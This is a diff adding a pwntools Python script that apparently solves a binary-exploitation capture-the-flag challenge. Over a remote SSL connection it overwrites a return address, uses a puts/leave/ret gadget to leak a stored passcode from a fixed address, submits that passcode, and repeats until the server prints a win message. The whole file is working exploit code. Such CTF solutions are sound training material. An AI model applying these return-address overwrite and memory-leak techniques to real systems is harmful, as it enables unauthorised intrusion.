@@ -1,0 +1,41 @@
+from pwn import *
+
+script = '''
+b *main + 94
+b *0x40162F
+'''
+
+HOST = "0556a97a272e50c843161c62ad3d60bc.chal.ctf.ae"
+
+while(True):
+    p = remote(HOST, 443, ssl = True, sni = HOST)
+    #p = process("./chall")
+    #p = gdb.debug("./chall", gdbscript = script)
+
+    main = 0x0000000000401575
+    p.sendafter(b"NickName> ", p64(main))
+    p.sendafter(b"Hard\n> ", b"15")
+    p.sendafter(b"Guess>> ", b"\x00")
+
+    passcode = 0x404060
+    puts_leave_ret = 0x0000000000401321
+    p.sendafter(b"NickName> ", p64(main) + p64(puts_leave_ret))
+    p.sendafter(b"Hard\n> ", b"16")
+    p.sendafter(b"Guess>> ", f"{passcode}".encode())
+
+    password = u64(p.recv(8))
+    print(hex(password))
+
+    p.sendafter(b"Hard\n> ", b"2")
+    p.sendafter(b"Guess>> ", f"{password}".encode())
+    
+    try:
+        p.recvuntil(b"WINNNN!")
+        break
+    except:
+        try:
+            p.close()
+        except:
+            pass
+    
+p.interactive()
